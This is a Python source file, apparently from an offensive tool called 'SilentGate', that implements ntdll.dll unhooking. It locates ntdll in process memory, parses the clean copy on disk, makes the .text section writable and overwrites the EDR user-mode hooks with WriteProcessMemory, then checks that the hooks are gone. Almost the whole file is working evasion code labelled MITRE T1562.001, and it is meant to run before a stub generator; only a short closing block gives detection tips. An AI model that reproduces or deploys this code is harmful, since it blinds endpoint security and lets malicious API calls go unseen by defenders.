"""
SilentGate - core/unhooker.py
v2.0 Feature: Ntdll Unhooking from Disk

Author  : JarDani
License : MIT
Purpose : Removes EDR user-mode hooks from ntdll.dll by
          overwriting the hooked in-memory .text section
          with the clean version read directly from disk.
          Must run on Windows before stub generation.

How it works:
  1. Locate ntdll.dll base address in process memory
  2. Open clean copy from disk
  3. Parse PE headers to find .text section
  4. Compare memory vs disk to identify hooks
  5. Overwrite hooked bytes with clean disk bytes
  6. Verify restoration and report findings

MITRE ATT&CK: T1562.001 - Impair Defenses
"""

import os
import sys
import struct
import platform
import ctypes
import ctypes.wintypes


# Path to ntdll on disk
NTDLL_PATH = r"C:\Windows\System32\ntdll.dll"

# Memory protection constants
PAGE_EXECUTE_READWRITE = 0x40
PAGE_EXECUTE_READ      = 0x20


def check_platform():
    """Unhooking requires Windows."""
    return platform.system() == "Windows"


def get_ntdll_base():
    """
    Find the base address of ntdll.dll loaded in current process.
    Uses EnumProcessModules to walk loaded modules.
    """
    if not check_platform():
        return None

    import ctypes.wintypes

    psapi    = ctypes.WinDLL("psapi")
    kernel32 = ctypes.WinDLL("kernel32")

    # Get handle to current process
    hProcess = kernel32.GetCurrentProcess()

    # Allocate buffer for module handles
    hMods    = (ctypes.wintypes.HMODULE * 1024)()
    cbNeeded = ctypes.wintypes.DWORD()

    # Enumerate all loaded modules
    if not psapi.EnumProcessModules(
        hProcess,
        ctypes.byref(hMods),
        ctypes.sizeof(hMods),
        ctypes.byref(cbNeeded)
    ):
        return None

    # Find ntdll.dll
    num_modules = cbNeeded.value // ctypes.sizeof(ctypes.wintypes.HMODULE)
    buf = ctypes.create_unicode_buffer(260)

    for i in range(num_modules):
        psapi.GetModuleFileNameExW(hProcess, hMods[i], buf, 260)
        if "ntdll.dll" in buf.value.lower():
            return hMods[i]

    return None


def read_disk_ntdll():
    """Read the clean ntdll.dll from disk."""
    if not os.path.exists(NTDLL_PATH):
        print(f"  [UNHOOKER] ERROR: ntdll.dll not found at {NTDLL_PATH}")
        return None
    with open(NTDLL_PATH, "rb") as f:
        return f.read()


def parse_text_section(data, base_addr=0):
    """
    Parse the PE header and find the .text section.
    Returns (section_offset, section_rva, section_size)

    PE Structure:
      DOS Header (0x40 bytes)
        e_lfanew at offset 0x3C -> PE header offset
      PE Header
        Signature (4 bytes)
        COFF Header (20 bytes)
        Optional Header (variable)
        Section Headers (40 bytes each)
    """
    try:
        # Verify DOS signature MZ
        if data[:2] != b"MZ":
            return None

        # Get PE header offset
        pe_offset = struct.unpack_from("<I", data, 0x3C)[0]

        # Verify PE signature
        if data[pe_offset:pe_offset+4] != b"PE\x00\x00":
            return None

        # COFF header starts after PE signature
        coff_offset = pe_offset + 4

        # Number of sections
        num_sections = struct.unpack_from("<H", data, coff_offset + 2)[0]

        # Size of optional header
        opt_header_size = struct.unpack_from("<H", data, coff_offset + 16)[0]

        # Section headers start after COFF + optional header
        sections_offset = coff_offset + 20 + opt_header_size

        # Walk section headers to find .text
        for i in range(num_sections):
            sec_off  = sections_offset + (i * 40)
            sec_name = data[sec_off:sec_off+8].rstrip(b"\x00")

            if sec_name == b".text":
                sec_rva        = struct.unpack_from("<I", data, sec_off + 12)[0]
                sec_raw_size   = struct.unpack_from("<I", data, sec_off + 16)[0]
                sec_raw_offset = struct.unpack_from("<I", data, sec_off + 20)[0]
                return {
                    "name":       ".text",
                    "rva":        sec_rva,
                    "raw_offset": sec_raw_offset,
                    "raw_size":   sec_raw_size,
                    "mem_addr":   base_addr + sec_rva if base_addr else sec_rva
                }
    except Exception as e:
        print(f"  [UNHOOKER] PE parse error: {e}")

    return None


def find_hooks(mem_bytes, disk_bytes, section_size, max_report=10):
    """
    Compare memory and disk .text sections byte by byte.
    Returns list of offsets where bytes differ (hook locations).
    """
    hooks    = []
    min_size = min(len(mem_bytes), len(disk_bytes), section_size)

    for i in range(min_size):
        if mem_bytes[i] != disk_bytes[i]:
            # Check if this is a JMP instruction (0xE9) — classic hook
            if disk_bytes[i] == 0x4C and mem_bytes[i] == 0xE9:
                hooks.append({
                    "offset":    i,
                    "type":      "JMP_HOOK",
                    "mem_byte":  hex(mem_bytes[i]),
                    "disk_byte": hex(disk_bytes[i])
                })
            elif len(hooks) == 0 or hooks[-1]["offset"] != i - 1:
                hooks.append({
                    "offset":    i,
                    "type":      "PATCH",
                    "mem_byte":  hex(mem_bytes[i]),
                    "disk_byte": hex(disk_bytes[i])
                })

    return hooks


def unhook_ntdll(explain=False):
    """
    Main function - performs ntdll unhooking.

    On Windows: performs real unhooking
    On Linux:   runs in simulation mode for development

    Returns dict with unhooking results.
    """
    if explain:
        print("\n  [UNHOOKER] Starting ntdll unhooking...")
        print("  [UNHOOKER] Technique: Overwrite hooked memory with clean disk copy")
        print("  [UNHOOKER] MITRE: T1562.001 - Impair Defenses\n")

    # Simulation mode on Linux
    if not check_platform():
        if explain:
            print("  [UNHOOKER] Linux detected - simulation mode")
            print("  [UNHOOKER] On Windows this would:")
            print("    1. Locate ntdll.dll base address in process memory")
            print("    2. Read clean copy from C:\\Windows\\System32\\ntdll.dll")
            print("    3. Parse PE header to find .text section")
            print("    4. Compare memory vs disk bytes to find hooks")
            print("    5. VirtualProtect .text to PAGE_EXECUTE_READWRITE")
            print("    6. Overwrite hooked bytes with clean disk bytes")
            print("    7. Restore original memory protection")
            print("    8. Verify restoration and report")

        return {
            "status":        "simulated",
            "platform":      "Linux",
            "hooks_found":   0,
            "hooks_removed": 0,
            "message":       "Run on Windows for live unhooking"
        }

    # Windows mode
    if explain:
        print("  [UNHOOKER] Step 1: Locating ntdll.dll in process memory...")

    ntdll_base = get_ntdll_base()
    if not ntdll_base:
        print("  [UNHOOKER] ERROR: Could not locate ntdll.dll base address")
        return {"status": "failed", "reason": "ntdll base not found"}

    if explain:
        print(f"  [UNHOOKER] ntdll.dll base address: {hex(ntdll_base)}")
        print("  [UNHOOKER] Step 2: Reading clean copy from disk...")

    disk_data = read_disk_ntdll()
    if not disk_data:
        return {"status": "failed", "reason": "could not read disk ntdll"}

    if explain:
        print(f"  [UNHOOKER] Disk ntdll.dll size: {len(disk_data):,} bytes")
        print("  [UNHOOKER] Step 3: Parsing PE header to find .text section...")

    # Parse disk .text section
    disk_text = parse_text_section(disk_data)
    if not disk_text:
        print("  [UNHOOKER] ERROR: Could not find .text section in disk ntdll")
        return {"status": "failed", "reason": "no .text section found"}

    if explain:
        print(f"  [UNHOOKER] .text section found:")
        print(f"             RVA        : {hex(disk_text['rva'])}")
        print(f"             Raw offset : {hex(disk_text['raw_offset'])}")
        print(f"             Size       : {disk_text['raw_size']:,} bytes")

    # Calculate memory address of .text section
    mem_text_addr = ntdll_base + disk_text["rva"]

    if explain:
        print(f"             Memory addr: {hex(mem_text_addr)}")
        print("  [UNHOOKER] Step 4: Comparing memory vs disk to find hooks...")

    # Read current memory bytes
    mem_bytes  = (ctypes.c_byte * disk_text["raw_size"])()
    kernel32   = ctypes.WinDLL("kernel32")
    bytes_read = ctypes.c_size_t(0)

    kernel32.ReadProcessMemory(
        kernel32.GetCurrentProcess(),
        ctypes.c_void_p(mem_text_addr),
        mem_bytes,
        disk_text["raw_size"],
        ctypes.byref(bytes_read)
    )

    mem_bytes_list  = list(mem_bytes)
    disk_bytes_list = list(
        disk_data[disk_text["raw_offset"]:
                  disk_text["raw_offset"] + disk_text["raw_size"]]
    )

    hooks = find_hooks(mem_bytes_list, disk_bytes_list, disk_text["raw_size"])

    if explain:
        print(f"  [UNHOOKER] Hooks found: {len(hooks)}")
        for hook in hooks[:5]:
            print(f"             Offset {hex(hook['offset'])}: "
                  f"memory={hook['mem_byte']} disk={hook['disk_byte']} "
                  f"type={hook['type']}")
        if len(hooks) > 5:
            print(f"             ... and {len(hooks)-5} more")

    if len(hooks) == 0:
        if explain:
            print("  [UNHOOKER] No hooks detected - ntdll appears clean")
        return {
            "status":        "clean",
            "hooks_found":   0,
            "hooks_removed": 0,
            "message":       "ntdll was not hooked"
        }

    if explain:
        print("  [UNHOOKER] Step 5: Changing .text memory protection to RWX...")

    # Change memory protection to writable
    old_protect = ctypes.wintypes.DWORD()
    kernel32.VirtualProtect(
        ctypes.c_void_p(mem_text_addr),
        disk_text["raw_size"],
        PAGE_EXECUTE_READWRITE,
        ctypes.byref(old_protect)
    )

    if explain:
        print(f"  [UNHOOKER] Old protection: {hex(old_protect.value)}")
        print("  [UNHOOKER] Step 6: Overwriting hooked bytes with clean disk bytes...")

    # Write clean bytes over hooked memory
    disk_text_bytes = (ctypes.c_byte * disk_text["raw_size"])(
        *disk_data[disk_text["raw_offset"]:
                   disk_text["raw_offset"] + disk_text["raw_size"]]
    )
    bytes_written = ctypes.c_size_t(0)

    kernel32.WriteProcessMemory(
        kernel32.GetCurrentProcess(),
        ctypes.c_void_p(mem_text_addr),
        disk_text_bytes,
        disk_text["raw_size"],
        ctypes.byref(bytes_written)
    )

    if explain:
        print(f"  [UNHOOKER] Bytes written: {bytes_written.value:,}")
        print("  [UNHOOKER] Step 7: Restoring original memory protection...")

    # Restore original protection
    kernel32.VirtualProtect(
        ctypes.c_void_p(mem_text_addr),
        disk_text["raw_size"],
        old_protect.value,
        ctypes.byref(old_protect)
    )

    if explain:
        print("  [UNHOOKER] Step 8: Verifying restoration...")

    # Verify - re-read and compare
    verify_bytes = (ctypes.c_byte * disk_text["raw_size"])()
    kernel32.ReadProcessMemory(
        kernel32.GetCurrentProcess(),
        ctypes.c_void_p(mem_text_addr),
        verify_bytes,
        disk_text["raw_size"],
        ctypes.byref(bytes_read)
    )

    verify_list      = list(verify_bytes)
    remaining_hooks  = find_hooks(
        verify_list, disk_bytes_list, disk_text["raw_size"]
    )

    if explain:
        print(f"  [UNHOOKER] Hooks before : {len(hooks)}")
        print(f"  [UNHOOKER] Hooks after  : {len(remaining_hooks)}")
        print(f"  [UNHOOKER] Hooks removed: {len(hooks) - len(remaining_hooks)}")

        if len(remaining_hooks) == 0:
            print("\n  [UNHOOKER] SUCCESS - ntdll fully unhooked")
            print("  [UNHOOKER] All EDR user-mode hooks removed")
            print("  [UNHOOKER] Subsequent API calls will not be intercepted")
        else:
            print(f"\n  [UNHOOKER] PARTIAL - {len(remaining_hooks)} hooks remain")

    return {
        "status":        "success" if len(remaining_hooks) == 0 else "partial",
        "hooks_found":   len(hooks),
        "hooks_removed": len(hooks) - len(remaining_hooks),
        "hooks_remain":  len(remaining_hooks),
        "ntdll_base":    hex(ntdll_base),
        "text_section":  disk_text,
        "mitre":         "T1562.001 - Impair Defenses"
    }


def print_unhook_report(result):
    """Print a formatted unhooking report."""
    print(f"""
  ╔══════════════════════════════════════════════════════════════╗
  ║  NTDLL UNHOOKING REPORT                                      ║
  ╚══════════════════════════════════════════════════════════════╝

  Status         : {result['status'].upper()}
  Hooks found    : {result.get('hooks_found', 0)}
  Hooks removed  : {result.get('hooks_removed', 0)}
  Hooks remaining: {result.get('hooks_remain', 0)}
  MITRE          : {result.get('mitre', 'T1562.001')}

  What this means:
  EDR placed {result.get('hooks_found', 0)} hooks in ntdll.dll memory.
  SilentGate overwrote them with clean bytes from disk.
  {result.get('hooks_removed', 0)} EDR interception points are now gone.
  Subsequent API calls will not trigger EDR handlers.

  Defender perspective:
  Monitor for unexpected writes to ntdll.dll memory pages.
  Compare ntdll .text section hash in memory vs disk periodically.
  Alert when in-memory ntdll differs from the disk version.
""")